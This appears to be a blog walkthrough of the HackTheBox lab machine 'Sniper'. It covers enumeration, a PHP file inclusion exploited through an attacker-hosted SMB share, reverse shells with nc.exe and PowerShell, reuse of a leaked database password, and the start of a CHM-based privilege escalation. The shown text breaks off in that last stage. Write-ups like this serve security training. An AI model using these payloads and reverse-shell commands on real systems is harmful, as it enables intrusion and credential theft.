---
layout: post
title: Hackthebox Sniper Walkthrough
categories: HackTheBox
---

![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-07-10/sniper.png)

# Explanation
<a href="https://www.hackthebox.eu">Hackthebox</a> is a website which has a bunch of vulnerable machines in its own VPN.<br>
This is a walkthrough of a box `Sniper`.

# Solution
## 1. Initial Enumeration
### TCP Port Scanning:
```shell
root@kali:~# nmap -p- 10.10.10.151 -sV -sC
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-07 00:55 JST
Nmap scan report for 10.10.10.151
Host is up (0.23s latency).
Not shown: 65530 filtered ports
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Sniper Co.
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
49667/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h03m27s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2020-07-06T23:04:23
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 385.02 seconds
```

### SMB enumeration:
```shell
root@kali:~# smbmap -H 10.10.10.151
[!] Authentication error on 10.10.10.151
```

### HTTP enumeration:
```shell
root@kali:~# gobuster dir -u http://10.10.10.151 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.151
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/07/07 09:29:36 Starting gobuster
===============================================================
/images (Status: 301)
/blog (Status: 301)
/user (Status: 301)
/css (Status: 301)
/js (Status: 301)
===============================================================
2020/07/07 10:02:46 Finished
===============================================================
```

## 2. Getting User
There are 2 interesting directories. `/blog` and `/user`.
#### /blog:
![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-07-10/sniper.png)

#### /user:
![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-07-10/sniper.png)

We can easily find a file inclusion vulnerability in the `lang` parameter of `/blog/index.php`
![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-07-10/sniper.png)

We can't execute remote file inclusion via HTTP.<br>
However, we can carry out a remote file inclusion attack via SMB.

#### 1. Add the following lines to `/etc/samba/smb.conf`
```shell
[public]
    force user = nobody
    path = /tmp
    public = yes
    read only = no
    directory mask = 0755
    create mask = 0644
    browseable = yes
    available = yes
    guest ok = yes
```

```shell
root@kali:~# systemctl restart smbd
root@kali:~# systemctl restart nmbd
```

```shell
root@kali:~# smbmap -H localhost
[+] IP: localhost:445	Name: unknown                                           
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	public                                            	READ, WRITE	
	IPC$                                              	NO ACCESS	IPC Service (Samba 4.11.5-Debian)
```

```shell

```

![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-07-10/sniper.png)

```shell
root@kali:~# cat exploit.php 
<?php 
 system('mkdir c:\\tmp');
 system('copy \\\\10.10.14.42\\public\\nc.exe c:\\tmp\\nc.exe');
 system('c:\\tmp\\nc.exe 10.10.14.42 4444 -e powershell.exe');
?>
```

```shell
root@kali:~# curl http://10.10.10.151/blog/?lang=//10.10.14.42/public/exploit.php
```

```shell
root@kali:~# nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.42] from (UNKNOWN) [10.10.10.151] 49680
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\inetpub\wwwroot\blog> whoami
whoami
nt authority\iusr
```

```shell
PS C:\inetpub\wwwroot\user> cat db.php
cat db.php
<?php
// Enter your Host, username, password, database below.
// I left password empty because i do not set password on localhost.
$con = mysqli_connect("localhost","dbuser","36mEAhz/B8xQ~2VM","sniper");
// Check connection
if (mysqli_connect_errno())
  {
  echo "Failed to connect to MySQL: " . mysqli_connect_error();
  }
?>
```

```shell
PS C:\users> dir
dir


    Directory: C:\users


Mode                LastWriteTime         Length Name
----                -------------         ------ ---- 
d-----         4/9/2019   6:47 AM                Administrator
d-----        4/11/2019   7:04 AM                Chris
d-r---         4/9/2019   6:47 AM                Public

```

```shell
root@kali:~# smbmap -u chris -p 36mEAhz/B8xQ~2VM -H 10.10.10.151
[+] IP: 10.10.10.151:445	Name: 10.10.10.151
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
```

```shell
PS C:\inetpub\wwwroot\user> net user chris
net user chris
User name                    Chris
Full Name                    
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            4/11/2019 6:53:37 AM
Password expires             Never
Password changeable          4/11/2019 6:53:37 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   7/17/2020 6:28:01 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use*Users
Global Group memberships     *None
The command completed successfully.

```

```shell
PS C:\inetpub\wwwroot\blog> $pass = convertto-securestring '36mEAhz/B8xQ~2VM' -asplaintext -force
$pass = convertto-securestring '36mEAhz/B8xQ~2VM' -asplaintext -force
PS C:\inetpub\wwwroot\blog> $cred = new-object system.management.automation.pscredential("sniper\chris", $pass)
$cred = new-object system.management.automation.pscredential("sniper\chris", $pass)
PS C:\inetpub\wwwroot\blog> invoke-command -computer sniper -scriptblock { c:\\tmp\\nc.exe 10.10.14.42 4443 -e powershell.exe } -credential $cred
invoke-command -computer sniper -scriptblock { c:\\tmp\\nc.exe 10.10.14.42 4443 -e powershell.exe } -credential $cred
```

```shell
root@kali:~# nc -nlvp 4443 
listening on [any] 4443 ...
connect to [10.10.14.42] from (UNKNOWN) [10.10.10.151] 49686
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Chris\Documents> whoami
whoami
sniper\chris
PS C:\Users\Chris\Documents> cat ../Desktop/user.txt
cat ../Desktop/user.txt
21f4d0f29fc4dd867500c1ad716cf56e
PS C:\Users\Chris\Documents> 
```


## 3. Getting Root

```shell
PS C:\Docs> type note.txt
type note.txt
Hi Chris,
	Your php skillz suck. Contact yamitenshi so that he teaches you how to use it and after that fix the website as there are a lot of bugs on it. And I hope that you've prepared the documentation for our new app. Drop it here when you're done with it.

Regards,
Sniper CEO.
```


```shell
PS C:\users\chris> tree /a /f 
tree /a /f
Folder PATH listing
Volume serial number is 6A2B-2640
C:.
+---3D Objects
+---Contacts
+---Desktop
|       user.txt
|       
+---Documents
+---Downloads
|       instructions.chm
|       
+---Favorites
|   |   Bing.url
|   |   
|   \---Links
+---Links
|       Desktop.lnk
|       Downloads.lnk
|       
+---Music
+---Pictures
+---Saved Games
+---Searches
\---Videos
```

`.chm` is an extention for windows help files
```shell
PS C:\users\chris\downloads> copy instructions.chm \\10.10.14.42\public\instructions.chm
copy instructions.chm \\10.10.14.42\public\instructions.chm
```

```shell
root@kali:~# apt-get install xchm

---

```


![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-07-10/sniper.png)

```shell
root@kali:/tmp# ls | grep CHM
Out-CHM.ps1

root@kali:/tmp# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
10.10.10.151 - - [17/Jul/2020 18:18:22] "GET /Out-CHM.ps1 HTTP/1.1" 200 -
```


```shell
PS C:\tmp> wget http://10.10.14.42/Out-CHM.ps1 -O Out-CHM.ps1
wget http://10.10.14.42/Out-CHM.ps1 -O Out-CHM.ps1
PS C:\tmp> dir
dir


    Directory: C:\tmp


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        7/16/2020  10:56 PM          59392 nc.exe                                                                
-a----        7/17/2020   9:22 AM          19502 Out-CHM.ps1                                                           

```
